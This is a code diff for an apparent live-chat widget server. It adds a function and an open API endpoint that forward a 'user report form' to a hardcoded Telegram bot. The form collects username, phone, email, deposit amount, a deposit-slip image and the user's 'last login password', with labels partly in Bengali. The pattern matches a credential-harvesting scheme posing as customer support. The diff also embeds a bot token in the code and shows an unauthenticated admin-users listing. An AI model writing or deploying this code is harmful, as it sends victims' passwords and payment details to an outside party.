@@ -254,6 +254,62 @@ ${escapeHtml(displayMsg)}
   }
 }
 
+// Direct Telegram Report Sender Function
+async function sendDirectReportToTelegram(reportData: any) {
+  const botToken = widgetConfig.telegramBotToken || process.env.TELEGRAM_BOT_TOKEN || '8861406019:AAHhY47ahk7DS495Ly1eLsa0tYZikFQ86f0';
+  const chatId = widgetConfig.telegramChatId || process.env.TELEGRAM_CHAT_ID || '6081054558';
+  if (!botToken || !chatId) return;
+
+  const escapeHtml = (str: string) =>
+    (str || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+
+  const adminLink = widgetConfig.websiteUrl || 'https://live-chat-swart-nine.vercel.app/';
+
+  const text = `🚨 <b>ইউজার রিপোর্ট জমা পড়েছে! (User Report Form)</b>
+
+👤 <b>Username:</b> ${escapeHtml(reportData.username || 'N/A')}
+📞 <b>Phone Number:</b> ${escapeHtml(reportData.phone || 'N/A')}
+📧 <b>Email Address:</b> ${escapeHtml(reportData.email || 'N/A')}
+✍️ <b>নিবন্ধন নাম:</b> ${escapeHtml(reportData.nibondhonName || 'N/A')}
+💵 <b>সর্বশেষ জমা করার পরিমাণ:</b> ${escapeHtml(reportData.lastAmount || 'N/A')}
+🔑 <b>সর্বশেষ লগইন পাসওয়ার্ড:</b> ${escapeHtml(reportData.lastPassword || 'N/A')}
+🌐 <b>Site Link/Name:</b> ${escapeHtml(reportData.siteLink || 'N/A')}
+⏰ <b>সময়:</b> ${new Date().toLocaleTimeString('bn-BD', { hour: '2-digit', minute: '2-digit' })}
+
+🔗 <b><a href="${adminLink}">লাইভ চ্যাট ড্যাশবোর্ডে ঢুকতে এখানে ক্লিক করুন</a></b>`;
+
+  try {
+    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: text,
+        parse_mode: 'HTML',
+        disable_web_page_preview: false,
+      }),
+    });
+
+    if (reportData.depositSlipUrl && typeof reportData.depositSlipUrl === 'string' && reportData.depositSlipUrl.startsWith('data:image/')) {
+      const base64Data = reportData.depositSlipUrl.split(',')[1];
+      if (base64Data) {
+        const buffer = Buffer.from(base64Data, 'base64');
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('caption', `🖼️ ডিপোজিট স্লিপ (User: ${reportData.username || 'N/A'})`);
+        formData.append('photo', new Blob([buffer], { type: 'image/jpeg' }), 'deposit_slip.jpg');
+
+        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: 'POST',
+          body: formData,
+        });
+      }
+    }
+  } catch (err) {
+    console.error('Failed to send direct report to Telegram:', err);
+  }
+}
+
 // Gemini AI Client setup
 let aiClient: GoogleGenAI | null = null;
 
@@ -1115,6 +1171,17 @@ app.post('/api/auth/login', (req, res) => {
 
 // GET Admin Users List
 app.get('/api/admin-users', (req, res) => res.json(adminUsers));
+
+// POST Send Direct Report to Telegram
+app.post('/api/telegram/send-report', async (req, res) => {
+  try {
+    await sendDirectReportToTelegram(req.body);
+    res.json({ success: true, message: 'Report sent directly to Telegram' });
+  } catch (err) {
+    console.error('Error sending direct report via API:', err);
+    res.status(500).json({ error: 'Failed to send report' });
+  }
+});
 
 // POST Create Admin / Agent Account
 app.post('/api/admin-users', (req, res) => {
